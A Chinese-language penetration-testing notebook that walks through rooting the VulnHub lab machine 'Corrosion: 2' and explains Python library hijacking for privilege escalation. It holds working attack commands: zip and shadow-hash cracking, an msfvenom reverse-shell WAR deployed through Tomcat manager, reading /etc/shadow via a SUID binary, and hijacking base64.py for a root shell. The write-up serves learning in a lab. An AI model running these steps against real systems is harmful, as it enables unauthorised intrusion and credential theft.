# 渗透测试



## 权限提审



### sudo



### Python 库劫持

#### PYTHONPATH

Python 在导入模块时，会按 `sys.path` 列表中的顺序搜索路径。攻击者可将恶意库放置在高优先级的路径中（如当前工作目录），覆盖合法库。

通过设置 `PYTHONPATH` 环境变量，添加攻击者控制的目录到模块搜索路径的最前端。



查看用户的 sudo 权限，允许设置环境变量，允许通过 sudo 以 root 用户允许某个 Python 脚本。

```
Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on corrosion:
    (root) SETENV: PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py
```



Python 脚本的内容如下，脚本中使用 base64，可以通过 PYTHONPATH 环境变量进行劫持。

```
import base64

message = input("Enter your string: ")
message_bytes = message.encode('ascii')
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode('ascii')

print(base64_message)
```



创建 /tmp/lib 目录，创建 base64.py 文件

```
-rwxrwxr-x 1 randy randy   33 Mar  3 03:39 base64.py
```



base64.py 文件的内容为启动一个 bash

```
import os
os.system('/bin/bash')
```



劫持成功

```
randy@corrosion:/tmp/lib$ sudo PYTHONPATH=/tmp/lib/ /usr/bin/python3.8 /home/randy/randombase64.py 
root@corrosion:/tmp/lib# id
uid=0(root) gid=0(root) groups=0(root)
```





#### 库文件修改

Python 脚本使用某个库文件（如：base64.py），允许以 root 用户脚本，用户可以**修改库文件内容**。



sudo 允许以 root 用户运行脚本

```
sudo -l

Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on corrosion:
    (root) PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py
```



Python 脚本如下：

```
import base64

message = input("Enter your string: ")
message_bytes = message.encode('ascii')
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode('ascii')

print(base64_message)
```



查看 Python 搜索库的路径

```
>>> import sys
>>> print("\n".join(sys.path))

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```



在系统上查找所有 base64.py 文件

```
locate base64.py

/home/randy/randombase64.py
/snap/core18/2128/usr/lib/python3.6/base64.py
/snap/gnome-3-34-1804/72/usr/lib/python2.7/base64.py
/snap/gnome-3-34-1804/72/usr/lib/python3.6/base64.py
/usr/lib/python3.8/base64.py
```



查看文件的权限（具有写入权限）

```
-rwxrwxrwx 1 root root 20420 Mar  2 16:52 /usr/lib/python3.8/base64.py
```



修改 base64.py 文件

![image-20250303085207798](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250303085207798.png)



sudo 执行脚本，获得 root 权限。

```
sudo /usr/bin/python3.8 /home/randy/randombase64.py 

[sudo] password for randy: 
root@corrosion:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```



### 动态链接库劫持





## vulnhub

### Corrosion: 2

Nmap 扫描 IP 地址。

```
msf6 > db_nmap -sP -PR -T 5 -n 10.10.10.0/24
[*] Nmap: Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-02 07:30 UTC
[*] Nmap: Nmap scan report for 10.10.10.1
[*] Nmap: Host is up (0.00047s latency).
[*] Nmap: MAC Address: 00:50:56:C0:00:0A (VMware)
[*] Nmap: Nmap scan report for 10.10.10.103
[*] Nmap: Host is up (0.00016s latency).
[*] Nmap: MAC Address: 00:0C:29:25:CD:30 (VMware)
[*] Nmap: Nmap scan report for 10.10.10.200
[*] Nmap: Host is up (0.000082s latency).
[*] Nmap: MAC Address: 00:50:56:FA:67:12 (VMware)
[*] Nmap: Nmap scan report for 10.10.10.10
[*] Nmap: Host is up.
[*] Nmap: Nmap done: 256 IP addresses (4 hosts up) scanned in 1.53 seconds
```

```
address       mac                name  os_name  os_flavor  os_sp  purpose  info  comments
-------       ---                ----  -------  ---------  -----  -------  ----  --------
10.10.10.1    00:50:56:C0:00:0A
10.10.10.10
10.10.10.103  00:0C:29:25:CD:30
10.10.10.200  00:50:56:FA:67:12
```

注：此处通过排除法确定 10.10.10.103 是靶机（因为其他机器全是我的）。



Nmap 扫描 IP 的 TCP 端口信息和操作系统信息。

```
msf6 > db_nmap -sS -sV -p- -r -n -T 5 -O 10.10.10.103
[*] Nmap: Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-02 07:35 UTC
[*] Nmap: Nmap scan report for 10.10.10.103
[*] Nmap: Host is up (0.00040s latency).
[*] Nmap: Not shown: 65532 closed tcp ports (reset)
[*] Nmap: PORT     STATE SERVICE VERSION
[*] Nmap: 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
[*] Nmap: 80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
[*] Nmap: 8080/tcp open  http    Apache Tomcat 9.0.53
[*] Nmap: MAC Address: 00:0C:29:25:CD:30 (VMware)
[*] Nmap: Device type: general purpose|router
[*] Nmap: Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
[*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
[*] Nmap: OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
[*] Nmap: Network Distance: 1 hop
[*] Nmap: Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 9.28 seconds
```

```
host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
10.10.10.103  22    tcp    ssh   open   OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 Ubuntu Linux; protocol 2.0
10.10.10.103  80    tcp    http  open   Apache httpd 2.4.41 (Ubuntu)
10.10.10.103  8080  tcp    http  open   Apache Tomcat 9.0.53
```

注：存在两个网站，通过浏览器访问，未发现有用的信息。



尝试使用 FFUF 扫描 80 端口的网页

```
ffuf -u http://10.10.10.103/indexFUZZ -w web-extensions-big.txt

.html                   [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 5ms]
.html                   [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 2ms]
:: Progress: [66886/66886] :: Job [1/1] :: 18181 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

```
ffuf -u http://10.10.10.103/FUZZ -w raft-medium-files-lowercase.txt

index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 2ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 0ms]
.                       [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 1ms]
.html                   [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
.htm                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 0ms]
.htpasswds              [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 0ms]
.htgroup                [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
.htaccess.bak           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 0ms]
.htuser                 [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
.ht                     [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
.htc                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1ms]
:: Progress: [16244/16244] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

注：没有发现任何有用的信息。以 . 开头的 .xxx 403 信息是误报。



尝试使用 FFUF 扫描 8080 端口的网页

```
ffuf -u http://10.10.10.103:8080/indexFUZZ -w web-extensions-big.txt
.jsp                    [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 37ms]
.jsp                    [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 14ms]
:: Progress: [66886/66886] :: Job [1/1] :: 13333 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
```

```
ffuf -u http://10.10.10.103:8080/FUZZ -w raft-large-files-lowercase.txt

favicon.ico             [Status: 200, Size: 21630, Words: 19, Lines: 22, Duration: 22ms]
.                       [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 6ms]
index.jsp               [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 3ms]
readme.txt              [Status: 200, Size: 153, Words: 28, Lines: 3, Duration: 7ms]
backup.zip              [Status: 200, Size: 33723, Words: 146, Lines: 121, Duration: 7ms]
:: Progress: [35325/35325] :: Job [1/1] :: 12500 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

发现 backup.zip 文件，可能是管理员在备份时忽视大意忘记删除了，通过 HTTP 服务暴露出来了。



使用 words 字典配合 .jsp,.zip,.txt 进行扫描。

```
ffuf -u http://10.10.10.103:8080/FUZZ -w raft-medium-words-lowercase.txt -e .jsp,.zip,.txt

index.jsp               [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 5ms]
docs                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3ms]
backup.zip              [Status: 200, Size: 33723, Words: 146, Lines: 121, Duration: 4ms]
manager                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
.                       [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 3ms]
readme.txt              [Status: 200, Size: 153, Words: 28, Lines: 3, Duration: 1ms]
examples                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3ms]
:: Progress: [225172/225172] :: Job [1/1] :: 1818 req/sec :: Duration: [0:00:39] :: Errors: 0 ::
```



端口扫描时发现 8080 是 tomcat 服务器，manager 是 tomcat 服务器的 web 管理页面。

访问页面需要提供账号密码。

![image-20250302162514632](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250302162514632.png)



下载压缩包，看看其中是否存在可用信息。

```
root@xiaoshae:/opt# wget http://10.10.10.103:8080/backup.zip
--2025-03-02 18:30:07--  http://10.10.10.103:8080/backup.zip
Connecting to 10.10.10.103:8080... connected.
HTTP request sent, awaiting response... 200 
Length: 33723 (33K) [application/zip]
Saving to: ‘backup.zip’

backup.zip                               100%[===============================================================================>]  32.93K  --.-KB/s    in 0s      

2025-03-02 18:30:07 (892 MB/s) - ‘backup.zip’ saved [33723/33723]
```



尝试解压，发现需要账号密码

```
unzip backup.zip 
Archive:  backup.zip
[backup.zip] catalina.policy password: root
```



使用 zip2john 提取 hash 

```
zip2john backup.zip > hash 

ver 2.0 efh 5455 efh 7875 backup.zip/catalina.policy PKZIP Encr: TS_chk, cmplen=2911, decmplen=13052, crc=AD0C6FDB ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/context.xml PKZIP Encr: TS_chk, cmplen=721, decmplen=1400, crc=59B9F4E7 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/catalina.properties PKZIP Encr: TS_chk, cmplen=2210, decmplen=7276, crc=1CD3C095 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/jaspic-providers.xml PKZIP Encr: TS_chk, cmplen=626, decmplen=1149, crc=748A87A6 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/jaspic-providers.xsd PKZIP Encr: TS_chk, cmplen=862, decmplen=2313, crc=3B44D150 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/logging.properties PKZIP Encr: TS_chk, cmplen=1076, decmplen=4144, crc=1D6C26F7 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/server.xml PKZIP Encr: TS_chk, cmplen=2609, decmplen=7589, crc=F91AC0C0 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/tomcat-users.xml PKZIP Encr: TS_chk, cmplen=1167, decmplen=2972, crc=BDCB08B9 ts=B0E3 cs=b0e3 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/tomcat-users.xsd PKZIP Encr: TS_chk, cmplen=858, decmplen=2558, crc=E8F588C2 ts=6920 cs=6920 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/web.xml PKZIP Encr: TS_chk, cmplen=18917, decmplen=172359, crc=B8AF6070 ts=6920 cs=6920 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```



尝试爆破密码

```
john --wordlist=rockyou.txt hash 

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Note: Passwords longer than 21 [worst case UTF-8] to 63 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
@administrator_hi5 (backup.zip)     
1g 0:00:00:01 DONE (2025-03-02 18:32) 0.9901g/s 11387Kp/s 11387Kc/s 11387KC/s @lexus1s..9Spruce
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

密码为：@administrator_hi5



解压压缩包

```
unzip backup.zip

Archive:  backup.zip
[backup.zip] catalina.policy password: 
  inflating: catalina.policy         
  inflating: context.xml             
  inflating: catalina.properties     
  inflating: jaspic-providers.xml    
  inflating: jaspic-providers.xsd    
  inflating: logging.properties      
  inflating: server.xml              
  inflating: tomcat-users.xml        
  inflating: tomcat-users.xsd        
  inflating: web.xml
```



查找文件信息，在 tomcat-users.xml 文件中发现 tomcat manager 的密码为 **melehifokivai**。

![image-20250302183425398](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250302183425398.png)



成功登录 manager 页面，发现可以部署 war 应用程序

![image-20250302183621629](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250302183621629.png)



使用 msfvenom 生成适用于 war 的反向 shell

```
msfvenom -p java/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=8080 -f war -o shell.war

Payload size: 6210 bytes
Final size of war file: 6210 bytes
Saved as: shell.war
```



使用 msfconsole 监听

```
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set PAYLOAD java/meterpreter/reverse_tcp 
PAYLOAD => java/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set LHOST 10.10.10.10
LHOST => 10.10.10.10

msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080

msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.10.10:8080 
```



在 manager 中部署 shell.war 应用程序

![image-20250302184036642](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250302184036642.png)



部署成功后访问页面（页面为空是正常情况）

![image-20250302184059909](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250302184059909.png)

![image-20250302184118563](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250302184118563.png)



反向 shell 连接成功

```
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.10.10:8080 
[*] Sending stage (58073 bytes) to 10.10.10.103
[*] Meterpreter session 1 opened (10.10.10.10:8080 -> 10.10.10.103:58936) at 2025-03-02 10:41:02 +0000

meterpreter > background 
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > 
```



提升会话

```
msf6 exploit(multi/handler) > sessions -u 1 
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
[!] SESSION may not be compatible with this module:
[!]  * missing Meterpreter features: stdapi_railgun_api, stdapi_sys_process_kill
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.10.10:4433 
[*] Command stager progress: 100.00% (773/773 bytes)

[*] Sending stage (1017704 bytes) to 10.10.10.103
msf6 exploit(multi/handler) > [*] Meterpreter session 2 opened (10.10.10.10:4433 -> 10.10.10.103:34140) at 2025-03-02 10:42:20 +0000
[*] Stopping exploit/multi/handler

msf6 exploit(multi/handler) > 
```



通过 Meterpreter 收集信息

```
msf6 exploit(multi/handler) > sessions -i 2 
[*] Starting interaction with 2...

meterpreter > sysinfo 
Computer     : 10.10.10.103
OS           : Ubuntu 20.04 (Linux 5.11.0-34-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > 
```



在 /home 路径下存在两个用户

```
tomcat@corrosion:/home$ ls
jaye
randy
```



尝试撞库攻击，使用 manager 的密码（**melehifokivai**），去 ssh 登录这两个用户，发现 jaye 用户密码和 manager 密码一致。

登录 jaye 账户后发现其存在一个 **SUID 和 SGID** 的可执行文件。

- 当用户执行该文件时，进程的 **有效用户 ID** 会临时变为文件所有者（`root`）。
- 进程的 **有效组 ID** 会临时变为文件所属组（`root`）。

```
jaye@corrosion:~/Files$ file look
look: setuid, setgid executable, regular file, no read permission
```



`look` 是一个命令行工具，通常用于在 **已排序的文件** 中查找以特定字符串开头的行。它的行为类似于简化的 `grep`，但专为快速查找前缀设计。

- `[-bdf]`：可选参数（选项）：
    - `-b`：在查找时忽略字符串前的空白（如空格、制表符）。
    - `-d`：仅比较字母、数字和空格（忽略其他字符，如标点符号）。
    - `-f`：忽略大小写（如将 "A" 和 "a" 视为相同）。
- `[-t char]`：指定终止符（`char` 是一个字符），仅匹配到该字符前的字符串。
- `string`：要查找的 **前缀字符串**（必需参数）。
- `[file ...]`：要搜索的文件列表（可选参数，默认可能使用系统字典文件）。



当普通用户 jaye 执行 look 命令是，look 命令会以 root 权限运行，使用 look 读取 /etc/shadow 文件

```
jaye@corrosion:~/Files$ ./look '' /etc/shadow 
root:$6$fHvHhNo5DWsYxgt0$.3upyGTbu9RjpoCkHfW.1F9mq5dxjwcqeZl0KnwEr0vXXzi7Tld2lAeYeIio/9BFPjUCyaBeLgVH1yK.5OR57.:18888:0:99999:7:::
...
randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:18888:0:99999:7:::
...
tomcat:$6$XD2Bs.tL01.5OT2b$.uXUR3ysfujHGaz1YKj1l9XUOMhHcKDPXYLTexsWbDWqIO9ML40CQZPI04ebbYzVNBFmgv3Mpd3.8znPfrBNC1:18888:0:99999:7:::
...
jaye:$6$Chqrqtd4U/B1J3gV$YjeAWKM.usyi/JxpfwYA6ybW/szqkiI1kerC4/JJNMpDUYKavQbnZeUh4WL/fB/4vrzX0LvKVWu60dq4SOQZB0:18887:0:99999:7:::
```



使用 john 成功爆破 randy 密码

```
john — wordlist=/usr/share/wordlists/rockyou.txt hash.txt
...
07051986randy
```



切换到 randy 用户

```
jaye@corrosion:/home/randy$ su randy 
Password: 
randy@corrosion:~$ 
```



查看 randy 的 sudo 权限，输出显示 Randy 可以使用提升的权限运行 Python 脚本。

```
randy@corrosion:~$ sudo -l 
[sudo] password for randy: 
Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on corrosion:
    (root) PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py
```



randombase64.py 仅 root 用户可以修改，查看这个 python 脚本发现其导入一个 base64 库文件。

```
import base64

message = input("Enter your string: ")
message_bytes = message.encode('ascii')
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode('ascii')

print(base64_message)
randy@corrosion:~$ file randombase64.py 
randombase64.py: ASCII text
```



基础的 Python 库劫持有 **PYTHONPATH环境变量、直接修改库文件（具有写权限）**。

因为 sudo 命令的安全设置，**会重置环境变量**，且无法设置环境变量，所以不存在**PYTHONPATH环境变量**。

```
randy@corrosion:/tmp/test$ sudo PYTHONPATH=/tmp/test/ /usr/bin/python3.8 /home/randy/randombase64.py 

sudo: sorry, you are not allowed to set the following environment variables: PYTHONPATH
```



查看 Python 搜索库的路径

```
>>> import sys
>>> print("\n".join(sys.path))

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```



在系统上查找所有 base64.py 文件

```
locate base64.py

/home/randy/randombase64.py
/snap/core18/2128/usr/lib/python3.6/base64.py
/snap/gnome-3-34-1804/72/usr/lib/python2.7/base64.py
/snap/gnome-3-34-1804/72/usr/lib/python3.6/base64.py
/usr/lib/python3.8/base64.py
```



查看文件的权限（具有写入权限）

```
-rwxrwxrwx 1 root root 20420 Mar  2 16:52 /usr/lib/python3.8/base64.py
```



修改 base64.py 文件

![image-20250303085207798](./images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/image-20250303085207798.png)



sudo 执行脚本，获得 root 权限。

```
sudo /usr/bin/python3.8 /home/randy/randombase64.py 

[sudo] password for randy: 
root@corrosion:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

